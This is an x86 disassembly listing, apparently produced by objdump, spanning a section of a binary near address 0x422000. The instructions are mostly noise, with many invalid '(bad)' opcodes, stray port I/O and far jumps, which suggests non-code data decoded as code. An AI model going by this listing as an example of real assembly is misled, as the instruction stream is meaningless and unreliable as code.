  4224d2:	sbb    al,0x94
  4224d4:	or     DWORD PTR [ebx-0x73e36b17],eax
  4224da:	mov    cs,WORD PTR [ebx+esi*4]
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	jb     0x42250d
  4224e0:	mov    al,ds:0xe61f1686
  4224e5:	dec    ebx
  4224e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e7:	in     al,0xe1
  4224e9:	jo     0x42252c
  4224eb:	retf   0x1381
  4224ee:	out    dx,eax
  4224ef:	ror    DWORD PTR [ecx+0x33],cl
  4224f2:	and    eax,0x726da408
  4224f7:	cs je  0x42247b
  4224fa:	pop    es
  4224fb:	or     DWORD PTR [edi+0x6d],edi
  4224fe:	in     eax,0xde
  422500:	dec    esp
  422501:	add    edx,DWORD PTR [esi]
  422503:	or     edx,DWORD PTR [ebx-0xd]
  422506:	mov    ch,0x94
  422508:	bound  edx,QWORD PTR [ebx]
  42250a:	xchg   ecx,eax
  42250b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42250c:	es int3 
  42250e:	ins    BYTE PTR es:[edi],dx
  42250f:	in     eax,0xc
  422511:	es jg  0x42254b
  422514:	mov    ebp,0x6d80cbd
  422519:	(bad)  
  42251a:	loopne 0x42252a
  42251c:	daa    
  42251d:	and    dl,dh
  42251f:	or     al,0x2f
  422521:	jl     0x42256a
  422523:	popf   
  422524:	jle    0x4225a4
  422526:	pop    ebp
  422527:	fnstenv [edx]
  422529:	xchg   DWORD PTR [edx],ebx
  42252b:	mov    ecx,0xf042ecfa
  422530:	cmp    esi,DWORD PTR [esi]
  422532:	inc    edx
  422533:	xchg   edi,eax
  422534:	xor    al,0x9b
  422536:	jge    0x422527
  422538:	xchg   ebx,eax
  422539:	loope  0x42259f
  42253b:	jp     0x4225b9
  42253d:	or     al,bh
  42253f:	or     eax,0xe3f8983b
  422544:	mov    edi,0x16894cdf
  422549:	jg     0x422598
  42254b:	xlat   BYTE PTR ds:[ebx]
  42254c:	es out dx,eax
  42254e:	cld    
  42254f:	sbb    al,0xeb
  422551:	jp     0x42250c
  422553:	xchg   ecx,eax
  422554:	sbb    DWORD PTR [ecx+0x11e918b1],ebp
  42255a:	xor    BYTE PTR cs:0xbe9abf5e,bh
  422561:	(bad)
  422565:	and    edx,ecx
  422567:	sub    eax,0x7010adb1
  42256c:	push   ss
  42256d:	test   al,0x5e
  42256f:	xchg   edx,eax
  422570:	xor    eax,0xf7862393
  422575:	je     0x422535
  422577:	mov    al,0x90
  422579:	ret    
  42257a:	add    al,0x61
  42257c:	ret    
  42257d:	xor    DWORD PTR [esp+edx*8],0x195b728c
  422584:	fs jmp 0x45aca65f
  42258a:	test   BYTE PTR [ebp+0x65],0xb9
  42258e:	push   ebp
  42258f:	jge    0x422591
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x500aa2f8]
  422602:	ins    BYTE PTR es:[edi],dx
  422603:	sbb    eax,DWORD PTR [esi+ebp*2+0x1]
  422607:	add    BYTE PTR [ecx+eax*1],al
  42260a:	add    BYTE PTR [eax],al
  42260c:	aaa    
  42260d:	sti    
  42260e:	pop    edi
  42260f:	mov    esp,0xaa2e9cff
  422614:	call   0x6842:0x45ff36fc
  42261b:	cmp    eax,0x180a3134
  422620:	rcl    DWORD PTR [ebx],1
  422622:	fsubr  st(3),st
  422624:	inc    ebp
  422625:	fadd   DWORD PTR [ebp-0x7fcc1beb]
  42262b:	imul   esi,DWORD PTR [edi+0x74],0x24
  42262f:	ret    
  422630:	nop
  422631:	fwait
  422632:	in     al,0x6c
  422634:	test   eax,0x6f5e0cb0
  422639:	push   cs
  42263a:	(bad)  
  42263b:	les    ebp,FWORD PTR [ebp+0x5b]
  42263e:	or     eax,0x746fde3a
  422643:	repz mov ds:0xcfc8c0ee,al
  422649:	imul   eax,DWORD PTR [edi],0xd99594e1
  42264f:	enter  0x28a5,0xf2
  422653:	out    0x6d,eax
  422655:	ss out dx,al
  422657:	pop    ecx
  422658:	push   ebp
  422659:	nop
  42265a:	mov    ch,0x4c
  42265c:	or     dl,BYTE PTR ds:0x490687c1
  422662:	(bad)  
  422664:	or     BYTE PTR [edx+0x40],al
  422667:	inc    edx
  422668:	mov    dl,0x9c
  42266a:	les    ebp,FWORD PTR [ebx+edi*2]
  42266d:	ins    BYTE PTR es:[edi],dx
  42266e:	xor    ebx,edx
  422670:	or     ebp,0x4a
  422673:	add    edi,esp
  422675:	(bad)  
  422676:	fist   WORD PTR [ecx]
  422678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422679:	out    0x97,al
  42267b:	cmp    ebx,DWORD PTR ds:0xce812a0e
  422681:	sti    
  422682:	inc    esi
  422683:	in     eax,dx
  422684:	rcr    BYTE PTR [ecx],1
  422686:	xchg   ebx,eax
  422687:	push   edx
  422688:	inc    esp
  422689:	ss dec ebx
  42268b:	cmp    eax,0xa23979ab
  422690:	test   eax,0xb083b42
  422695:	jnp    0x422629
  422697:	push   edi
  422698:	js     0x422661
  42269a:	inc    esi
  42269b:	gs xchg ebp,eax
  42269d:	lods   eax,DWORD PTR ds:[esi]
  42269e:	dec    eax
  42269f:	sub    ch,BYTE PTR [ebx]
  4226a1:	adc    dl,BYTE PTR ds:0xcef4ceb3
  4226a7:	fs clc 
  4226a9:	fst    DWORD PTR [ecx+0x5d620f08]
  4226af:	pop    ebx
  4226b0:	sub    cl,dl
  4226b2:	pop    edi
  4226b3:	data16 jb 0x422711
  4226b6:	cmp    BYTE PTR [esi],0xf0
  4226b9:	or     BYTE PTR [ebx],0xf5
  4226bc:	out    dx,eax
  4226bd:	shl    ah,1
  4226bf:	imul   cl
  4226c1:	scas   al,BYTE PTR es:[edi]
  4226c2:	icebp  
  4226c3:	adc    bh,ah
  4226c5:	aaa    
  4226c6:	pop    edx
  4226c7:	loopne 0x422677
  4226c9:	cld    
  4226ca:	scas   eax,DWORD PTR es:[edi]
  4226cb:	je     0x42272f
  4226cd:	mov    eax,ds:0x7311a76e
  4226d2:	xchg   ebx,eax
  4226d3:	sub    bl,BYTE PTR [ecx]
  4226d5:	cmp    DWORD PTR [ebx+0x15751ac7],0xffffffea
  4226dc:	jbe    0x422700
  4226de:	jno    0x4226c7
  4226e0:	mov    ebp,0x944edef6
  4226e5:	fld    QWORD PTR [ebx-0xd722283]
  4226eb:	jnp    0x422679
  4226ed:	and    eax,0xebecfa40
  4226f2:	rcl    DWORD PTR [ebx-0x6],1
  4226f5:	sar    DWORD PTR [ebx+0x4d],0x7b
  4226f9:	push   ds
  4226fa:	sub    BYTE PTR [eax-0x34],ah
  4226fd:	and    DWORD PTR [eax+0x362ee963],ecx
  422703:	cdq    
  422704:	push   ebp
  422705:	(bad)  
  422706:	push   0x5f753062
  42270b:	pop    esi
  42270c:	pop    ds
  42270d:	fst    DWORD PTR [ebp+0x1e]
	...
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x997f01c8
  422781:	sub    edx,DWORD PTR [eax+0x4]
  422784:	dec    eax
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	(bad)  
  42278d:	cmp    bh,ch
  42278f:	pop    ecx
  422790:	mov    BYTE PTR [esi+0x5e],ah
  422793:	(bad)  
  422795:	and    ebx,DWORD PTR [esi]
  422797:	les    edi,FWORD PTR [ebx]
  422799:	out    0x15,al
  42279b:	lods   eax,DWORD PTR ds:[esi]
  42279c:	jns    0x422808
  42279e:	int    0x27
  4227a0:	jge    0x422807
  4227a2:	stos   DWORD PTR es:[edi],eax
  4227a3:	mov    ds:0xdad7557a,al
  4227a8:	fnsave [ebx+0x2]
  4227ab:	iret   
  4227ac:	ds ins BYTE PTR es:[edi],dx
  4227ae:	(bad)  
  4227af:	ins    DWORD PTR es:[edi],dx
  4227b0:	int3   
  4227b1:	mov    esp,0x24f6996e
  4227b6:	jp     0x4227d1
  4227b8:	mov    ebp,0x64ff3fad
  4227bd:	mov    edi,DWORD PTR [eax]
  4227bf:	and    dl,BYTE PTR [edi+ebx*4-0x6]
  4227c3:	rol    cl,0x3f
  4227c6:	mov    ecx,0x2858979e
  4227cb:	lahf   
  4227cc:	and    esi,DWORD PTR [ebx]
  4227ce:	sbb    al,0xa7
  4227d0:	fsubr  QWORD PTR [esi+ecx*4-0x39]
  4227d4:	iret   
  4227d5:	sbb    DWORD PTR ds:0xfd39313,ebx
  4227db:	mov    cl,0xa
  4227dd:	xor    eax,eax
  4227df:	aas    
  4227e0:	ret    
  4227e1:	fmul   QWORD PTR [ecx-0xc]
  4227e4:	es out 0xd4,al
  4227e7:	dec    ebx
  4227e8:	lods   eax,DWORD PTR ds:[esi]
  4227e9:	sbb    DWORD PTR [ecx+0x1945ee4d],edi
  4227ef:	out    dx,eax
  4227f0:	icebp  
  4227f1:	out    0xfb,al
  4227f3:	ss out 0x25,al
  4227f6:	outs   dx,DWORD PTR ds:[esi]
  4227f7:	fimul  DWORD PTR [edx+0x5d]
  4227fa:	shl    DWORD PTR ds:0xd039f96c,0xfe
  422801:	repnz std 
  422803:	sbb    ebx,ebx
  422805:	(bad)  
  422806:	jne    0x422798
  422808:	cmp    al,0xdf
  42280a:	or     ebx,DWORD PTR [ecx+ebp*2-0x18]
  42280e:	xlat   BYTE PTR ds:[ebx]
  42280f:	popa   
  422810:	xchg   edx,eax
  422811:	pop    ebp
  422812:	pop    edi
  422813:	mov    BYTE PTR [esp+ebp*8+0x0],dh
  422817:	dec    esi
  422818:	add    ah,ah
  42281a:	inc    BYTE PTR [esi-0x141f1271]
  422820:	dec    ecx
  422821:	in     eax,0x62
  422823:	or     ecx,DWORD PTR [ecx+0x35]
  422826:	mov    ch,bh
  422828:	lods   eax,DWORD PTR ds:[esi]
  422829:	adc    eax,0xa205729e
  42282e:	hlt    
  42282f:	shl    DWORD PTR [ebx-0xa6a5f79],cl
  422835:	aaa    
  422836:	xchg   edx,eax
  422837:	rcl    BYTE PTR [edi+0x10],0x63
  42283b:	sub    ah,bh
  42283d:	jmp    0x422812
  42283f:	pop    ss
  422840:	fldcw  WORD PTR [eax]
  422842:	mov    dl,cl
  422844:	or     edx,DWORD PTR [edx+eax*4+0x0]
  422848:	mov    al,0x7b
  42284a:	and    DWORD PTR [ebp+0x42],ebx
  42284d:	adc    eax,0x5113c170
  422852:	scas   al,BYTE PTR es:[edi]
  422853:	xor    ecx,DWORD PTR [edi]
  422855:	fisub  DWORD PTR [ebx]
  422857:	sti    
  422858:	into   
  422859:	mov    eax,DWORD PTR [edx+0x1f]
  42285c:	xor    ebp,ebp
  42285e:	data16 jle 0x422898
  422861:	ret    0x7024
  422864:	push   ss
  422865:	mov    esp,0x40090148
  42286a:	jmp    0x4228c7
  42286c:	retf   
  42286d:	sub    al,0x88
  42286f:	mov    bl,0xa1
  422871:	jo     0x4228df
  422873:	push   esi
  422874:	adc    dh,bh
  422876:	test   DWORD PTR [eax-0x6b],ebx
  422879:	out    0x2f,eax
  42287b:	or     dh,BYTE PTR [edx]
  42287d:	loopne 0x4228d3
  42287f:	cdq    
  422880:	daa    
  422881:	push   ebx
  422882:	sahf   
  422883:	dec    edx
  422884:	pop    ebp
  422885:	jmp    0xd90:0xdae3d6f4
  42288c:	lods   al,BYTE PTR ds:[esi]
  42288d:	sub    eax,0x8f1d
	...
  4228f2:	add    BYTE PTR [eax],al
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228d9
  422901:	and    edi,edi
  422903:	mov    ah,0x4c
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	in     eax,dx
  42290d:	inc    esp
  42290e:	mov    ch,0x36
  422910:	jmp    0xc50bfd0
  422915:	dec    edx
  422916:	xor    DWORD PTR [ecx+0x13],edi
  422919:	dec    esp
  42291a:	or     BYTE PTR [edx],cl
  42291c:	(bad)  
  42291d:	hlt    
  42291e:	dec    edi
  42291f:	(bad)  
  422920:	sbb    bl,BYTE PTR [edi-0x642d6ee9]
  422926:	pop    ebx
  422927:	(bad)  [edi+0x21c0da27]
  42292d:	dec    esi
  42292e:	push   0x698e4601
  422933:	push   ebx
  422934:	pop    esi
  422935:	aam    0x1b
  422937:	pop    edx
  422938:	out    dx,eax
  422939:	outs   dx,DWORD PTR ds:[esi]
  42293a:	js     0x422979
  42293c:	cwde   
  42293d:	std    
  42293e:	mov    al,0x25
  422940:	push   0x88533bda
  422945:	and    al,0x9b
  422947:	fild   WORD PTR ds:0xb8b2eea2
  42294d:	rol    dh,cl
  42294f:	inc    edx
  422950:	push   ecx
  422951:	pop    ecx
  422952:	scas   eax,DWORD PTR es:[edi]
  422953:	push   eax
  422954:	pop    ecx
  422955:	inc    edx
  422956:	xor    ecx,DWORD PTR ds:0x7aa3faf1
  42295c:	pop    eax
  42295d:	cli    
  42295e:	xchg   BYTE PTR [ebp-0x4f],dh
  422961:	sbb    DWORD PTR [edx+0xa],ebp
  422964:	lock add eax,0x34e4f617
  42296a:	ficom  DWORD PTR [ecx-0x35]
  42296d:	cld    
  42296e:	stos   DWORD PTR es:[edi],eax
  42296f:	pop    ds
  422970:	lock jg 0x4229ce
  422973:	cmp    BYTE PTR [esi],dh
  422975:	loope  0x42297a
  422977:	adc    BYTE PTR [ecx+0x73],al
  42297a:	mov    BYTE PTR [ecx+0x2e],cl
  42297d:	ds lock adc eax,0xa50dfdb7
  422984:	les    esp,FWORD PTR [edi+0x51302532]
  42298a:	push   ecx
  42298b:	dec    esp
  42298c:	aad    0x24
  42298e:	pop    eax
  42298f:	lods   al,BYTE PTR ds:[esi]
  422990:	push   ecx
  422991:	inc    edi
  422992:	outs   dx,DWORD PTR ds:[esi]
  422993:	xor    eax,0x87f4d555
  422998:	adc    al,0x8a
  42299a:	fcomi  st,st(7)
  42299c:	jmp    0x6c66bd3e
  4229a1:	xor    DWORD PTR [ebx],esp
  4229a3:	scas   eax,DWORD PTR es:[edi]
  4229a4:	jns    0x422a04
  4229a6:	loop   0x4229dc
  4229a8:	in     al,dx
  4229a9:	xchg   BYTE PTR [ecx],dl
  4229ab:	in     al,0xd9
  4229ad:	jmp    0x65bd032c
  4229b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229b3:	sbb    BYTE PTR [edx-0x75d7e9c4],0xcc
  4229ba:	sub    eax,0x8bca1c2c
  4229bf:	add    BYTE PTR [eax],ch
  4229c1:	call   DWORD PTR [ebp-0x1c768af0]
  4229c7:	test   eax,0xc9bfcec3
  4229cc:	aad    0x70
  4229ce:	inc    ecx
  4229cf:	sbb    eax,0xfccaea0d
  4229d4:	sar    ebp,0x73
  4229d7:	hlt    
  4229d8:	cmp    al,0x81
  4229da:	imul   edi,DWORD PTR ds:0x10137f1b,0x0
  4229e1:	hlt    
  4229e2:	lods   eax,DWORD PTR ds:[esi]
  4229e3:	stos   DWORD PTR es:[edi],eax
  4229e4:	mov    eax,ds:0x57e9b5b4
  4229e9:	push   0x58251bfe
  4229ee:	ret    
  4229ef:	xchg   esi,eax
  4229f0:	sahf   
  4229f1:	test   BYTE PTR [esi],al
  4229f3:	jae    0x422a08
  4229f5:	push   esi
  4229f6:	out    dx,eax
  4229f7:	shr    DWORD PTR [ebx+0x68],0xe
  4229fb:	mov    ah,0xcd
  4229fd:	or     DWORD PTR [edx],edi
  4229ff:	test   DWORD PTR [edi+ebp*8],ebp
  422a02:	in     al,0xfb
  422a04:	std    
  422a05:	mov    bh,0x13
  422a07:	idiv   BYTE PTR [ecx+ebx*4]
  422a0a:	dec    esi
  422a0b:	sub    DWORD PTR [esp+edi*2+0x27],edi
  422a0f:	pop    eax
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	inc    edi
  422a81:	fistp  QWORD PTR [edx+eax*2+0x50]
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	xor    cl,dh
  422a8e:	cs popf 
  422a90:	outs   dx,BYTE PTR ds:[esi]
  422a91:	stc    
  422a92:	or     ch,cl
  422a94:	mov    BYTE PTR [esi+ebx*2],ah
  422a97:	pushf  
  422a98:	jno    0x422b19
  422a9a:	xchg   ebp,eax
  422a9b:	push   eax
  422a9c:	xchg   edx,eax
  422a9d:	adc    dh,BYTE PTR [ebx+ebp*1+0x508af615]
  422aa4:	adc    cl,bl
  422aa6:	outs   dx,BYTE PTR ds:[esi]
  422aa7:	xor    al,0x87
  422aa9:	scas   al,BYTE PTR es:[edi]
  422aaa:	sub    cl,BYTE PTR [esi-0x4685376e]
  422ab0:	scas   eax,DWORD PTR es:[edi]
  422ab1:	cmp    bl,BYTE PTR cs:[ecx]
  422ab4:	adc    BYTE PTR [ecx],ch
  422ab6:	push   edx
  422ab7:	cmp    DWORD PTR [ecx+ecx*1-0x4bf4eebd],esi
  422abe:	sub    eax,0xfd820cd4
  422ac3:	ins    BYTE PTR es:[edi],dx
  422ac4:	pop    ss
  422ac5:	xchg   ebx,eax
  422ac6:	cs jnp 0x422a9a
  422ac9:	push   edx
  422aca:	xchg   ecx,eax
  422acb:	push   edi
  422acc:	mov    bl,0xed
  422ace:	rcr    BYTE PTR [eax*2+0x42685dc8],cl
  422ad5:	xchg   BYTE PTR ss:[esi+edx*4+0x168b0c25],al
  422add:	jne    0x422af5
  422adf:	ds dec ebp
  422ae1:	jns    0x422acc
  422ae3:	or     dl,BYTE PTR [edx+ecx*1]
  422ae6:	jmp    0xf03343cc
  422aeb:	mov    ebx,0x3f2e642e
  422af0:	loopne 0x422ad6
  422af2:	and    bh,dl
  422af4:	mov    al,ds:0x8aa6bb8c
  422af9:	adc    BYTE PTR [ecx+eax*4],ch
  422afc:	loope  0x422ae2
  422afe:	inc    edi
  422aff:	fisttp WORD PTR [eax+0x706e2be9]
  422b05:	bnd je 0x422b0c
  422b08:	cmp    DWORD PTR [eax+0x18],esi
  422b0b:	lds    ebp,FWORD PTR [ecx+0x6d]
  422b0e:	iret   
  422b0f:	xlat   BYTE PTR ds:[ebx]
  422b10:	int3   
  422b11:	outs   dx,DWORD PTR ds:[esi]
  422b12:	adc    eax,0x5fe103f7
  422b17:	into   
  422b18:	sub    DWORD PTR [eax+0x43],0xcbaf709d
  422b1f:	push   eax
  422b20:	add    bl,BYTE PTR [ebx+0x33]
  422b23:	fadd   st(1),st
  422b25:	loope  0x422b84
  422b27:	dec    edi
  422b28:	mov    cl,0xd3
  422b2a:	pop    eax
  422b2b:	stc    
  422b2c:	rcr    BYTE PTR [eax-0x5fbe9acf],0x65
  422b33:	cwde   
  422b34:	and    cl,ch
  422b36:	cwde   
  422b37:	or     ebp,DWORD PTR [edx]
  422b39:	mov    bh,0xff
  422b3b:	or     edx,DWORD PTR [esi+0x3b0b4fa2]
  422b41:	add    dl,BYTE PTR [ecx+ecx*2-0x7c]
  422b45:	lock and al,0x45
  422b48:	mov    eax,ds:0xabe8fead
  422b4d:	nop
  422b4e:	outs   dx,DWORD PTR ds:[esi]
  422b4f:	inc    edx
  422b50:	enter  0x142b,0xf6
  422b54:	inc    edi
  422b55:	loop   0x422b93
  422b57:	pop    es
  422b58:	jne    0x422b5b
  422b5a:	jo     0x422ba9
  422b5c:	int    0xbe
  422b5e:	test   al,0x4f
  422b60:	in     eax,0x9a
  422b62:	call   0x28aa:0x816382d
  422b69:	stos   BYTE PTR es:[edi],al
  422b6a:	test   al,0xd4
  422b6c:	sbb    al,0xd3
  422b6e:	and    DWORD PTR [edi+0x56fe04d3],eax
  422b74:	inc    edx
  422b75:	daa    
  422b76:	xchg   esp,eax
  422b77:	es aas 
  422b79:	or     edx,eax
  422b7b:	ret    
  422b7c:	out    0x3,eax
  422b7e:	retf   
  422b7f:	clc    
  422b80:	pop    es
  422b81:	or     dl,dh
  422b83:	cld    
  422b84:	mov    esp,0xbfa19f51
  422b89:	pushf  
  422b8a:	aam    0xc0
  422b8c:	xor    eax,0xcca266
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x37e84d9c]
  422c02:	inc    esp
  422c03:	add    dl,BYTE PTR [edx+esi*2+0x1]
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	jnp    0x422bff
  422c0e:	jle    0x422bfb
  422c10:	xchg   edx,eax
  422c11:	icebp  
  422c12:	mov    ebp,0xd710f29b
  422c17:	out    dx,al
  422c18:	aaa    
  422c19:	sbb    DWORD PTR ds:0x619cfe33,0x68e4e81a
  422c23:	mov    ch,0xb9
  422c25:	sub    al,0xee
  422c27:	push   edx
  422c28:	cdq    
  422c29:	aad    0x1a
  422c2b:	rcl    BYTE PTR [esi-0x6fb3c2b1],0x8b
  422c32:	mov    eax,0xded317d9
  422c37:	leave  
  422c38:	enter  0x74af,0x1f
  422c3c:	and    cl,0x33
  422c3f:	mov    ah,0x4b
  422c41:	pop    edi
  422c42:	sub    edx,DWORD PTR cs:[ebx-0x2b9d5bea]
  422c49:	stos   DWORD PTR es:[edi],eax
  422c4a:	cli    
  422c4b:	outs   dx,BYTE PTR ds:[esi]
  422c4c:	xchg   DWORD PTR [ebp+0x4b92684a],esi
  422c52:	ja     0x422c31
  422c54:	cli    
  422c55:	int    0xac
  422c57:	jmp    0x4d67aed4
  422c5c:	adc    al,0xde
  422c5e:	add    ah,0x98
  422c61:	jp     0x422c1a
  422c63:	jno    0x422c33
  422c65:	push   eax
  422c66:	and    eax,esi
  422c68:	sub    edi,DWORD PTR [eax+0x11]
  422c6b:	pop    ecx
  422c6c:	sub    ecx,DWORD PTR [ebx-0x39]
  422c6f:	xchg   ecx,eax
  422c70:	push   es
  422c71:	xchg   ebp,eax
  422c72:	mov    ah,0x2a
  422c74:	lea    edi,[edi+0x14]
  422c77:	mov    BYTE PTR [ebx+edx*4-0x7b681c06],bh
  422c7e:	xor    al,0x91
  422c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c81:	sub    edx,ebp
  422c83:	sbb    DWORD PTR ds:[ebx],ebp
  422c86:	aad    0x8e
  422c88:	xchg   edx,eax
  422c89:	jg     0x422c9a
  422c8b:	(bad)  
  422c8c:	lods   al,BYTE PTR ds:[esi]
  422c8d:	stos   DWORD PTR es:[edi],eax
  422c8e:	arpl   WORD PTR [eax],cx
  422c90:	fwait
  422c91:	popa   
  422c92:	cli    
  422c93:	fist   DWORD PTR [ecx-0x55]
  422c96:	push   0x7c
  422c98:	cmp    cl,cl
  422c9a:	andps  xmm5,XMMWORD PTR [edx-0x36]
  422c9e:	dec    ecx
  422c9f:	mov    ecx,0x962f0d80
  422ca4:	outs   dx,DWORD PTR ds:[esi]
  422ca5:	mov    eax,ds:0xfcd6ae76
  422caa:	imul   edx,DWORD PTR [esi],0xffffff95
  422cad:	push   ds
  422cae:	fsub   DWORD PTR [edi-0x2e]
  422cb1:	popa   
  422cb2:	int    0x3d
  422cb4:	inc    ecx
  422cb5:	or     DWORD PTR [ecx-0x65608217],edx
  422cbb:	sahf   
  422cbc:	loopne 0x422ce9
  422cbe:	jno    0x422c94
  422cc0:	mov    dl,0x29
  422cc2:	sub    eax,0x283e4b8a
  422cc7:	fdiv   st,st(7)
  422cc9:	lea    edx,[ebp+0x7116c467]
  422ccf:	call   0xdb7a:0x8cc7e22d
  422cd6:	or     eax,0x76e3e82
  422cdb:	cmp    eax,0x28dcb311
  422ce0:	push   esp
  422ce1:	xor    DWORD PTR [ebx+esi*2-0xc],esp
  422ce5:	stos   BYTE PTR es:[edi],al
  422ce6:	dec    ecx
  422ce7:	shr    DWORD PTR [edi-0x4b464640],cl
  422ced:	jecxz  0x422c98
  422cef:	push   esi
  422cf0:	lds    eax,FWORD PTR [eax]
  422cf2:	les    eax,FWORD PTR [esp+eax*8-0x537c7898]
  422cf9:	loop   0x422ca5
  422cfb:	inc    ecx
  422cfc:	div    BYTE PTR [ebp-0x338a3ed7]
  422d02:	xor    ch,BYTE PTR [ebp-0x69d8a70]
  422d08:	test   al,0x10
  422d0a:	clc    
  422d0b:	inc    eax
  422d0c:	out    dx,al
  422d0d:	add    eax,0xe072
	...
  422d72:	add    BYTE PTR [eax],al
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ecx,DWORD PTR [ecx]
  422d81:	ds mov edx,0x173580c
  422d87:	add    BYTE PTR [ecx+eax*1],al
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	ret    0xd92e
  422d8f:	xor    al,0xd0
  422d91:	cli    
  422d92:	xlat   BYTE PTR ds:[ebx]
  422d93:	xchg   edx,eax
  422d94:	lods   eax,DWORD PTR ds:[esi]
  422d95:	dec    ebp
  422d96:	test   al,0xcd
  422d98:	cmc    
  422d99:	xor    cl,BYTE PTR [edx+0x56]
  422d9c:	int    0x79
  422d9e:	loop   0x422d78
  422da0:	iret   
  422da1:	add    eax,0x49707840
  422da6:	jge    0x422d61
  422da8:	loopne 0x422d4e
  422daa:	imul   esp,DWORD PTR [eax-0x35],0x8b45456e
  422db1:	aam    0xca
  422db3:	mov    cl,0xa0
  422db5:	dec    esp
  422db6:	jmp    0x422dd1
  422db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422db9:	push   ecx
  422dba:	xor    ebp,DWORD PTR [eax-0x657330b3]
  422dc0:	pop    eax
  422dc1:	nop
  422dc2:	pop    ss
  422dc3:	fld    st(1)
  422dc5:	push   ds
  422dc6:	inc    edx
  422dc7:	stc    
  422dc8:	add    ecx,esp
  422dca:	mov    DWORD PTR [esi-0x34],edx
  422dcd:	in     eax,dx
  422dce:	aaa    
  422dcf:	xchg   ebx,eax
  422dd0:	lock int3 
  422dd2:	fisubr WORD PTR [eax-0x2e23ceda]
  422dd8:	add    al,bh
  422dda:	iret   
  422ddb:	imul   ebp,edi,0x51
  422dde:	(bad)  
  422de0:	pop    esp
  422de1:	jg     0x422de3
  422de3:	fcom   QWORD PTR [ebx]
  422de5:	sbb    edi,DWORD PTR [edx-0x27]
  422de8:	or     eax,0xd7f90895
  422ded:	mov    bl,0x98
  422def:	nop
  422df0:	fild   DWORD PTR [esi]
  422df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422df3:	xchg   ebx,eax
  422df4:	out    dx,al
  422df5:	cmp    esp,DWORD PTR [esi-0x3e]
  422df8:	jmp    0x15e:0x95d5b15d
  422dff:	pop    ecx
  422e00:	sbb    eax,0x39dd44c1
  422e05:	xor    bl,BYTE PTR [ebp+0x62]
  422e08:	adc    al,0xee
  422e0a:	stc    
  422e0b:	ror    edx,1
  422e0d:	inc    esi
  422e0e:	pop    ebp
  422e0f:	mov    ds:0x626a938e,al
  422e14:	fnstcw WORD PTR ds:0x53d12579
  422e1a:	jnp    0x422e8f
  422e1c:	aam    0xa6
  422e1e:	es inc ebp
  422e20:	cmp    esi,eax
  422e22:	mov    cl,0xe9
  422e24:	je     0x422e37
  422e26:	xor    DWORD PTR [eax+ecx*8],edx
  422e29:	sub    eax,0x1aad7876
  422e2e:	icebp  
  422e2f:	jmp    0x1f86f7f1
  422e34:	out    dx,al
  422e35:	loop   0x422eab
  422e37:	xchg   DWORD PTR es:[eax],edx
  422e3a:	clc    
  422e3b:	xchg   ebp,eax
  422e3c:	(bad)  
  422e3d:	imul   ebx,DWORD PTR [ebx+0x15],0xad9aebdf
  422e44:	cmc    
  422e45:	mov    cl,0xf3
  422e47:	add    esp,edi
  422e49:	popf   
  422e4a:	fcomp  DWORD PTR [edi]
  422e4c:	(bad)  
  422e4e:	jle    0x422e80
  422e50:	clc    
  422e51:	das    
  422e52:	adc    DWORD PTR [edi],edi
  422e54:	mov    ah,0x14
  422e56:	cmc    
  422e57:	or     esi,esp
  422e59:	aad    0xab
  422e5b:	cmp    BYTE PTR [ecx],0xa3
  422e5e:	ret    
  422e5f:	or     dh,BYTE PTR [ecx]
  422e61:	cdq    
  422e62:	jns    0x422e7e
  422e64:	mov    edx,0x5d0c628d
  422e69:	jbe    0x422e71
  422e6b:	add    eax,0x9bbca0d5
  422e70:	lods   al,BYTE PTR ds:[esi]
  422e71:	dec    ebx
  422e72:	lahf   
  422e73:	and    edx,eax
  422e75:	sbb    eax,0xb6800ab0
  422e7a:	mov    BYTE PTR [ebp-0x4cc88282],bl
  422e80:	enter  0xdcde,0xb6
  422e84:	push   0x78
  422e86:	rol    DWORD PTR [ebp-0x780744cc],1
  422e8c:	js     0x422efe
  422e8e:	inc    ebp
  422e8f:	icebp  
	...
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0xb397ca33
  422f02:	lahf   
  422f03:	call   0x43a364
  422f08:	add    al,0x1
  422f0a:	add    BYTE PTR [eax],al
